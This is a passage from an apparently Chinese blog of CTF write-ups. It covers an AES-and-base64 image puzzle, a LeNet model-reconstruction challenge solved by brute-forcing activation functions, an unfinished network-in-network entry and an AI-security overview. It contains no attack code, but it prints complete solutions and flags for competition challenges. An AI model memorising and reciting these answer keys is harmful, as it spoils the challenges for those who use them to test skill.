<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">*#* *提供的信息</span><br><span class="line">*key_hex = &quot;dd8e671df3882c5be6423cd030bd7cb6&quot;</span><br><span class="line">iv_hex = &quot;88219bdee9c396eca3c637c0ea436058&quot;</span><br><span class="line">ciphertext_hex = &quot;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&quot;</span><br><span class="line"></span><br><span class="line">*#* *将十六进制的**key**、**iv**和**ciphertext**转换为字节串</span><br><span class="line">*key = binascii.unhexlify(key_hex)</span><br><span class="line">iv = binascii.unhexlify(iv_hex)</span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line">*#* *创建**AES**解密器对象</span><br><span class="line">*cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">*#* *解密数据</span><br><span class="line">*decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">*#* *将解密后的字节数据转换为字符串</span><br><span class="line">*decrypted_string = decrypted_data.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">*#* *打印解密后的字符串</span><br><span class="line">*print(decrypted_string)</span><br></pre></td></tr></table></figure>
<p>最终计算下来结果为一串十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d</span><br></pre></td></tr></table></figure>
<p>然后转字符，转base64得到网址</p>
<p><strong><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></strong></p>
<p>下载下来一张图片</p>
<p><img src="https://s2.loli.net/2023/09/29/8eWuRQc2y3htlYi.png" alt=""></p>
<p>然后第一反应识图，结果google继陌生的语言后又失效喽（悲</p>
<p>后来又想到题目一开始就有了提示，星穹铁道，然后搜索相关的文字，找到了贝洛伯格特殊文字</p>
<p><img src="https://s2.loli.net/2023/09/29/biMX7Bx8CuJwScr.jpg" alt=""></p>
<p>然后跟表对照得到最终的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;HRP_aIways_likes_March_7th&#125;</span><br></pre></td></tr></table></figure>
<p>(PS:做图文题做到够，麻了)</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NepNep</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（2）LeNet</title>
    <url>/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/</url>
    <content><![CDATA[<h1>AI-CTF（2）LeNet</h1>
<p>本题来自2023香山杯，目前已上线i春秋平台</p>
<p><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=70899">https://www.ichunqiu.com/battalion?t=1&amp;r=70899</a></p>
<p>赛事进行时解出来的仅有国科大师傅的一支队伍，后续有看过他们的题解，但是没看明白，所以一直没有复现，后来出题方给出了官方题解和思路介绍，才明白本题的意思。</p>
<p>另外，做题前先看一下LeNet的网络结构</p>
<p>这是一个经典的手写识别模型，首先看一下基本的结构图</p>
<p><img src="https://s2.loli.net/2023/11/18/vCRd6oXKi1EH2Nh.png" alt=""></p>
<ul>
<li>
<p>池化（ Padding ）是指在输入数据的边缘添加一定数量的像素，使得输出数据的尺寸能够与输入数据相匹配。也就是在矩阵的边界上填充一些值，以增加矩阵的大小，通常用 0 或者复制边界像素来进行填充。</p>
</li>
<li>
<p>步幅（Stride）是指卷积核在每一次卷积操作中滑动的距离。步长的大小可以影响输出数据的大小，也可以影响特征提取能力和计算复杂度。当步长增大时，输出数据的尺寸会减小，特征提取能力会变弱，但计算速度会加快。</p>
</li>
<li>
<p>通道数（Channel）也称为深度或特征图数量，是指卷积神经网络中每一层输出的特征图数量。通道数的大小直接影响了卷积神经网络的特征提取能力和计算复杂度。通过增加通道数，可以增强卷积神经网络的特征提取能力，但也会增加计算复杂度。</p>
</li>
</ul>
<p>LeNet的网络结构相对简单，主要由卷积层、池化层和全连接层组成。</p>
<ol>
<li>
<p><strong>卷积层（Convolutional Layers）:</strong></p>
<ul>
<li>第一层：卷积层，使用卷积操作提取特征，通常包含多个卷积核（filters）。</li>
<li>激活函数：通常在卷积层后使用sigmoid或tanh等激活函数。</li>
</ul>
</li>
<li>
<p><strong>池化层（Pooling Layers）:</strong></p>
<ul>
<li>第一层：池化层，通过最大池化或平均池化减小特征图的尺寸，降低计算复杂度。</li>
</ul>
</li>
<li>
<p><strong>卷积层（Convolutional Layers）:</strong></p>
<ul>
<li>第二层：再次使用卷积层，提取更高级的特征。</li>
</ul>
</li>
<li>
<p><strong>池化层（Pooling Layers）:</strong></p>
<ul>
<li>第二层：再次使用池化层，继续降低特征图的尺寸。</li>
</ul>
</li>
<li>
<p><strong>Flatten层：</strong></p>
<ul>
<li>将池化层的输出展平为一维向量，为了连接到全连接层做准备。</li>
</ul>
</li>
<li>
<p><strong>全连接层（Fully Connected Layers）:</strong></p>
<ul>
<li>第一层：通常包含几百个神经元，用于学习更抽象的特征。</li>
<li>激活函数：通常使用sigmoid或tanh等激活函数。</li>
</ul>
</li>
<li>
<p><strong>全连接层（Fully Connected Layers）:</strong></p>
<ul>
<li>第二层：输出层，神经元数量等于分类的类别数。</li>
<li>激活函数：通常使用softmax函数，用于多类别分类问题。</li>
</ul>
</li>
</ol>
<p>下载附件有三个文件，分别是flag.rar，label.json，<a href="http://MyLeNet.pt">MyLeNet.pt</a>。所以首先针对模型查看，尝试复原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pt:</span><br><span class="line">    <span class="built_in">print</span>(i,pt[i].shape)</span><br></pre></td></tr></table></figure>
<p>所获得的网络结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conv1.weight torch.Size([6, 1, 5, 5])</span><br><span class="line">conv1.bias torch.Size([6])</span><br><span class="line">conv2.weight torch.Size([16, 6, 5, 5])</span><br><span class="line">conv2.bias torch.Size([16])</span><br><span class="line">fc1.weight torch.Size([120, 256])</span><br><span class="line">fc1.bias torch.Size([120])</span><br><span class="line">fc2.weight torch.Size([84, 120])</span><br><span class="line">fc2.bias torch.Size([84])</span><br><span class="line">fc3.weight torch.Size([62, 84])</span><br><span class="line">fc3.bias torch.Size([62])</span><br></pre></td></tr></table></figure>
<p>一个LeNet模型的网络结构</p>
<ol>
<li>
<p><code>conv1</code>: 一个卷积层，输入通道数为1（灰度图像），输出通道数为6，卷积核大小为5x5。</p>
<ul>
<li><code>conv1.weight</code> 的形状为 <code>[6, 1, 5, 5]</code>，表示有6个卷积核，每个卷积核的大小为5x5。</li>
<li><code>conv1.bias</code> 的形状为 <code>[6]</code>，表示每个卷积核有一个偏置项。</li>
</ul>
</li>
<li>
<p><code>conv2</code>: 第二个卷积层，输入通道数为6，输出通道数为16，卷积核大小为5x5。</p>
<ul>
<li><code>conv2.weight</code> 的形状为 <code>[16, 6, 5, 5]</code>，表示有16个卷积核，每个卷积核的大小为5x5。</li>
<li><code>conv2.bias</code> 的形状为 <code>[16]</code>，表示每个卷积核有一个偏置项。</li>
</ul>
</li>
<li>
<p><code>fc1</code>: 第一个全连接层，输入特征数为<code>16 * 5 * 5</code>（第二个卷积层输出的特征图展平成一维向量），输出特征数为120。</p>
<ul>
<li><code>fc1.weight</code> 的形状为 <code>[120, 16 * 5 * 5]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc1.bias</code> 的形状为 <code>[120]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
<li>
<p><code>fc2</code>: 第二个全连接层，输入特征数为120，输出特征数为84。</p>
<ul>
<li><code>fc2.weight</code> 的形状为 <code>[84, 120]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc2.bias</code> 的形状为 <code>[84]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
<li>
<p><code>fc3</code>: 第三个全连接层，输入特征数为84，输出特征数为62。</p>
<ul>
<li><code>fc3.weight</code> 的形状为 <code>[62, 84]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc3.bias</code> 的形状为 <code>[62]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
</ol>
<p>目前已知的网络结构已经包含了卷积层，全连接层，但是可以发现这之间是缺少了损失函数的。</p>
<p>当然这里参考并且了解了一下官方思路和唯一解题队伍思路的区别。</p>
<p>从官方出题人思路来看需要考虑池化存在两种方式和激活函数</p>
<ol>
<li>
<p>暂且按照LeNet神经网络中的最大池化来设计，于是可以写出如下网络结构</p>
<ul>
<li>当采用最大池化时，激活和池化的顺序并不影响计算结果</li>
<li>卷积 -&gt; 激活 -&gt; 池化</li>
<li>卷积 -&gt; 池化 -&gt; 激活</li>
<li>最大池化</li>
<li>平均池化</li>
</ul>
</li>
<li>
<p>常见的激活函数有如下4+1种</p>
<ul>
<li>Sigmoid函数</li>
<li>Tanh/双曲正切函数</li>
<li>ReLU函数</li>
<li>Softmax函数(一般出现在一个网络的最后一层)</li>
<li>未使用激活函数</li>
</ul>
</li>
</ol>
<p>（PS：实际在LeNet网络中，通常使用Sigmoid或Tanh激活函数在全连接层中，而在卷积层中可能使用Sigmoid、Tanh、ReLU等）</p>
<p>而在实际解题队伍是通过查看pt的pkl文件去发现模型中使用了Sigmoid函数和ReLU函数，然后再每一个需要使用的链接处进行遍历，查看哪一个能实际输出所需要的。</p>
<p><img src="https://s2.loli.net/2023/11/18/JKsFoHWEc7OnwBk.png" alt=""></p>
<p>（PS：复现到这边的时候又卡壳了，官方给出的exp不完全，qwq）</p>
<p>其实就是文件还剩下的一个label.json，以此作为标签映射</p>
<p>这是通过官方的给出的题解修改得到的完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里是完整复原的网络结构，基本符合了上面所告知的LeNet层</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, list_func</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.idx = list_func</span><br><span class="line">        self.func = [<span class="literal">None</span>, nn.Sigmoid(), nn.Tanh(), nn.ReLU(), nn.Softmax()]</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">1</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool1 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">6</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool2 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">16</span> * <span class="number">4</span> * <span class="number">4</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">0</span>]](x)</span><br><span class="line">        x = self.maxpool1(x)</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">1</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">1</span>]](x)</span><br><span class="line">        x = self.maxpool2(x)</span><br><span class="line">        x = torch.flatten(x, start_dim=<span class="number">1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">2</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">2</span>]](x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">3</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">3</span>]](x)</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 从label.json加载标签映射</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./label.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    label_mapping = json.load(json_file)</span><br><span class="line"><span class="comment"># 反转字典，将整数编码映射回字母</span></span><br><span class="line">reverse_label_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> label_mapping.items()&#125;</span><br><span class="line"><span class="comment"># 获取所有标签</span></span><br><span class="line">chars = <span class="built_in">list</span>(reverse_label_mapping.values())</span><br><span class="line">arrange_list = [[ j, k, l, m] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="comment"># 这一部分会输出所有生成的base64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for idxs in arrange_list[:500]:</span></span><br><span class="line"><span class="string">    model = MyLeNet(idxs)</span></span><br><span class="line"><span class="string">    model.load_state_dict(pt)</span></span><br><span class="line"><span class="string">    tmp = &quot;&quot;</span></span><br><span class="line"><span class="string">    for i in range(56):</span></span><br><span class="line"><span class="string">        npy_0 = np.load(&quot;./flag/&quot;+str(i)+&quot;.npy&quot;).reshape((1,1,28,28)) # 调整样本为输入形状</span></span><br><span class="line"><span class="string">        tmp += str(chars[int(model(torch.tensor(npy_0).to(&#x27;cpu&#x27;)).argmax())])</span></span><br><span class="line"><span class="string">        print(tmp[-1],end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">    print()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 改进后的实现查找开头为flag的字符串</span></span><br><span class="line"><span class="keyword">for</span> idxs <span class="keyword">in</span> arrange_list:</span><br><span class="line">    model = MyLeNet(idxs)</span><br><span class="line">    model.load_state_dict(pt)</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">        npy_0 = np.load(<span class="string">&quot;./flag/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.npy&quot;</span>).reshape((<span class="number">1</span>,<span class="number">1</span>,<span class="number">28</span>,<span class="number">28</span>))</span><br><span class="line">        tmp += chars[<span class="built_in">int</span>(model(torch.tensor(npy_0).to(<span class="string">&#x27;cpu&#x27;</span>)).argmax())]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = base64.b64decode(tmp).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># 已知flag为开头，所以可以通过这个去进行相应的查找</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(idxs)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>官方给出的exp是将可能的方法存储于指定列表，然后去查找，所以再此另外补充一份，确定了网络结构的exp，因为通过官方wp，已经得出了相应的激活函数，所以就不浪费时间了</p>
<p>搓了另外一份简化版exp，当然了，是得知了激活函数的前提下啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(LeNet, self).__init__()</span><br><span class="line">        <span class="comment"># 定义卷积层和连接层</span></span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">1</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool1 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">6</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool2 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 定义全连接层</span></span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">256</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        x = self.maxpool1(x)</span><br><span class="line">        x = nn.Sigmoid()(x)</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        x = self.maxpool2(x)</span><br><span class="line">        x = nn.ReLU()(x)</span><br><span class="line">        x = torch.flatten(x, start_dim=<span class="number">1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        x = nn.Sigmoid()(x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        x = nn.ReLU()(x)</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 创建LeNet实例</span></span><br><span class="line">lenet_model = LeNet()</span><br><span class="line"><span class="comment"># 加载预训练的权重</span></span><br><span class="line">lenet_model.load_state_dict(pt)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./label.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    label_mapping = json.load(json_file)</span><br><span class="line"><span class="comment"># 反转字典，将整数编码映射回字母</span></span><br><span class="line">reverse_label_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> label_mapping.items()&#125;</span><br><span class="line"><span class="comment"># 获取所有标签</span></span><br><span class="line">chars = <span class="built_in">list</span>(reverse_label_mapping.values())</span><br><span class="line"><span class="comment"># 读取从0到56的.npy文件</span></span><br><span class="line">predicted_chars = []  <span class="comment"># 用于保存所有的预测字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):  <span class="comment"># 从0到56</span></span><br><span class="line">    npy_file_path = <span class="string">f&quot;./flag/<span class="subst">&#123;i&#125;</span>.npy&quot;</span></span><br><span class="line">    npy_data = np.load(npy_file_path).reshape((<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">    torch_input = torch.tensor(npy_data).<span class="built_in">float</span>()  <span class="comment"># 转换为PyTorch张量</span></span><br><span class="line">    <span class="comment"># 使用LeNet模型进行推理</span></span><br><span class="line">    output = lenet_model(torch_input)</span><br><span class="line">    <span class="comment"># 获取预测结果的索引</span></span><br><span class="line">    predicted_index = torch.argmax(output, dim=<span class="number">1</span>).item()</span><br><span class="line">    <span class="comment"># 根据索引获取对应的字符</span></span><br><span class="line">    predicted_char = chars[predicted_index]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Prediction for <span class="subst">&#123;npy_file_path&#125;</span>: <span class="subst">&#123;predicted_char&#125;</span>&quot;</span>)</span><br><span class="line">    predicted_chars.append(predicted_char)</span><br><span class="line"><span class="comment"># 将获取的字符串拼接起来</span></span><br><span class="line">result_string = <span class="string">&#x27;&#x27;</span>.join(predicted_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Concatenated Result:&quot;</span>, result_string)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>香山杯</tag>
        <tag>AI</tag>
        <tag>LeNet</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（3）network-in-network</title>
    <url>/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/</url>
    <content><![CDATA[<h1>AI-CTF（3）network-in-network</h1>
<p>本题来自2023HITCTF，这是赛后进行的复现</p>
<p>有被骂到，qwq~~</p>
<p><img src="https://s2.loli.net/2023/12/01/bB4Tfy8JHpP2Nd9.png" alt=""></p>
<p>首先来看问题代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line">m = trans(file)</span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>简单解释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用 PIL 打开一张名为 ‘origin.jpg’ 的图像。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<p>创建一个图像转换操作的管道，将图像转换为 PyTorch 的张量（tensor）。<code>transforms.ToTensor()</code> 将图像转换为张量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = trans(file)</span><br></pre></td></tr></table></figure>
<p>通过上面的转换管道，将图像 ‘origin.jpg’ 转换为张量 <code>m</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br></pre></td></tr></table></figure>
<p>设置 PyTorch 的随机种子，以确保结果的可重复性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>构建一个简单的卷积神经网络（CNN）模型。该模型由以下层组成：</p>
<ul>
<li>一个卷积层 (<code>nn.Conv2d</code>)，输入通道数为 3，输出通道数为 5，卷积核大小为 3。</li>
<li>一个 ReLU 激活函数 (<code>nn.ReLU</code>)。</li>
<li>一个卷积层，输入通道数为 5，输出通道数为 10，卷积核大小为 5。</li>
<li>一个 ReLU 激活函数。</li>
<li>一个最大池化层 (<code>nn.MaxPool2d</code>)，池化窗口大小为 2。</li>
<li>一个全连接层 (<code>nn.Linear</code>)，输入特征数为 317，输出特征数为 800。</li>
<li>一个卷积层，输入通道数为 10，输出通道数为 1，卷积核大小为 1。</li>
<li>一个 Sigmoid 激活函数 (<code>nn.Sigmoid</code>)。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用模型对输入图像进行处理，将处理后的张量通过 <code>squeeze()</code> 去掉维度为 1 的尺寸，然后使用 <code>torchvision.utils.save_image</code> 将处理后的图像保存为 ‘enc.png’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>其实，这题的重点问题模型的输出逆推。首先，是前面卷积层卷积核小，仅捕捉局部细节特征，对整体图像不会有太大影响。其次，在全连接层，将十个通道进行了归一化处理，因此我们所能得到的仅是全连接层后被均值处理后的图像。</p>
<p>被困难卡住了，得弄明白回来补充</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>HITCTF</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-安全（1）总述</title>
    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
    <content><![CDATA[<h1>AI安全</h1>
<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
<p>这是引用的其中的一段话：</p>
<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
<p>学习心得及相关记录如下：</p>
<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
<p>AI相关CTF赛题：</p>
